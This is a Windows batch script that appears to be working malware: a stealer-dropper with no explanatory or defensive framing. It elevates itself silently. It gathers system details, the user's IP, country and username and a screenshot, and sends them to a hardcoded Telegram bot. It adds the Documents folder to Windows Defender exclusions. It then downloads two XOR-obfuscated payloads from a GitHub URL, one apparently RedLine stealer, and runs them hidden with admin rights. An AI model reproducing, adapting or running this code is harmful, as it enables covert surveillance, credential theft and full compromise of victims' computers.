@echo off
:: Ensure script is running as Administrator
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'runas' -Verb RunAs -WindowStyle Hidden"
    exit /b
)


setlocal enabledelayedexpansion

:: Define Telegram Bot Token and Chat ID
set BOT_TOKEN=7798343183:AAGpLsAYe4d4_tRdau8dEcbOflVXET5GIEw
set CHAT_ID=-1002460772493
set SCREENSHOT_PATH=%TEMP%\screenshot.png
set IP_API_URL=http://ipinfo.io/json

:: Get system information
for /f "tokens=2 delims==" %%A in ('wmic os get Caption /value') do set "os_name=%%A"
for /f "tokens=2 delims==" %%A in ('wmic cpu get Name /value') do set "cpu_name=%%A"
for /f "tokens=2 delims==" %%A in ('wmic computersystem get NumberOfLogicalProcessors /value') do set "cores=%%A"
for /f "tokens=2 delims==" %%A in ('wmic os get TotalVisibleMemorySize /value') do set ram_kb=%%A
set /a ram_mb=!ram_kb! / 1024
set /a ram_gb=!ram_mb! / 1024

:: Get IP and Country information
for /f "delims=" %%A in ('powershell -command "Invoke-WebRequest -Uri '%IP_API_URL%' -UseBasicParsing | ConvertFrom-Json | ForEach-Object { $_.ip + ',' + $_.country }"') do (
    set "ip_country=%%A"
)

:: Parse IP and Country
for /f "tokens=1,2 delims=," %%A in ("%ip_country%") do (
    set "ip=%%A"
    set "country=%%B"
)

:: Get current username
for /f "delims=" %%A in ('whoami') do set "username=%%A"

:: Check if Telegram is installed
set TELEGRAM_INSTALLED=No
if exist "%appdata%\Telegram Desktop\" set TELEGRAM_INSTALLED=Yes
if exist "%appdata%\Telegram Desktop\Telegram.exe" set TELEGRAM_INSTALLED=Yes

:: Format Telegram message correctly with line breaks
set "message=<b>Hit Detected :)</b>"
set "message=!message!<b>                                                                                                                     ====[HIT INFO]====</b>"
set "message=!message!<b>                                                                                                                [+] System =></b> !os_name!"
set "message=!message!<b>                                                                                                                [+] RAM =></b> !ram_gb! GB"
set "message=!message!<b>                                                                                                                [+] Processor =></b> !cpu_name!"
set "message=!message!<b>                                                                                                                [+] Cores =></b> !cores!"
set "message=!message!<b>                                                                                                                [+] IP =></b> !ip!"
set "message=!message!<b>                                                                                                                [+] Country =></b> !country!"
set "message=!message!<b>                                                                                                                [+] User =></b> !username!"
set "message=!message!<b>                                                                                                                [+] Telegram Installed =></b> <code>!TELEGRAM_INSTALLED!</code>"
set "message=!message!<b>                                                                                                                [+] Date =></b> %date% %time%"

:: Send message to Telegram
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
     -d "text=!message!" ^
     -d "parse_mode=HTML" >nul 2>&1

:: Capture screenshot using PowerShell
powershell -Command ^
    Add-Type -AssemblyName System.Windows.Forms; ^
    Add-Type -AssemblyName System.Drawing; ^
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); ^
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap); ^
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); ^
    $bitmap.Save('%SCREENSHOT_PATH%', [System.Drawing.Imaging.ImageFormat]::Png); ^
    $graphics.Dispose(); ^
    $bitmap.Dispose()

:: Send screenshot to Telegram
if exist "%SCREENSHOT_PATH%" (
    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
        -F "chat_id=%CHAT_ID%" ^
        -F "photo=@%SCREENSHOT_PATH%" >nul 2>&1
    del "%SCREENSHOT_PATH%" >nul 2>&1
)

endlocal




:: Define URLs and paths
set "encryptedRLUrl=https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/encrypt.txt"
set "encryptedBerlinUrl=https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/redline.txt"
set "docsDir=%USERPROFILE%\Documents"
set "encryptedRLFile=%docsDir%\encrypted-rl-error.txt"
set "encryptedBerlinFile=%docsDir%\system-error.txt"
set "decryptedRLExe=%docsDir%\decrypted-rl.exe"
set "decryptedBerlinExe=%docsDir%\decrypted-berlin.exe"
set "encryptionKey=123"

:: Ensure Documents directory exists
if not exist "%docsDir%" (
    powershell -WindowStyle Hidden -Command "New-Item -ItemType Directory -Path '%docsDir%' -Force" >nul 2>&1
)

:: Add Documents folder to Windows Defender Exclusions
powershell -WindowStyle Hidden -Command ^
    "try { Add-MpPreference -ExclusionPath '%docsDir%' } catch { exit 1 }" >nul 2>&1

:: Download encrypted files
powershell -WindowStyle Hidden -Command ^
    "Invoke-WebRequest -Uri '%encryptedRLUrl%' -UseBasicParsing -OutFile '%encryptedRLFile%'" >nul 2>&1

powershell -WindowStyle Hidden -Command ^
    "Invoke-WebRequest -Uri '%encryptedBerlinUrl%' -UseBasicParsing -OutFile '%encryptedBerlinFile%'" >nul 2>&1

:: Decrypt files
powershell -WindowStyle Hidden -Command ^
    "$encryptedDataBase64 = Get-Content '%encryptedRLFile%' -Raw; $encryptedData = [Convert]::FromBase64String($encryptedDataBase64); $decryptedData = $encryptedData | ForEach-Object { $_ -bxor %encryptionKey% }; [System.IO.File]::WriteAllBytes('%decryptedRLExe%', $decryptedData)" >nul 2>&1

powershell -WindowStyle Hidden -Command ^
    "$encryptedDataBase64 = Get-Content '%encryptedBerlinFile%' -Raw; $encryptedData = [Convert]::FromBase64String($encryptedDataBase64); $decryptedData = $encryptedData | ForEach-Object { $_ -bxor %encryptionKey% }; [System.IO.File]::WriteAllBytes('%decryptedBerlinExe%', $decryptedData)" >nul 2>&1

:: Execute decrypted files with Admin rights
powershell -WindowStyle Hidden -Command ^
    "Start-Process -FilePath '%decryptedRLExe%' -Verb RunAs -WindowStyle Hidden" >nul 2>&1

powershell -WindowStyle Hidden -Command ^
    "Start-Process -FilePath '%decryptedBerlinExe%' -Verb RunAs -WindowStyle Hidden" >nul 2>&1

:: Exit silently
exit /b
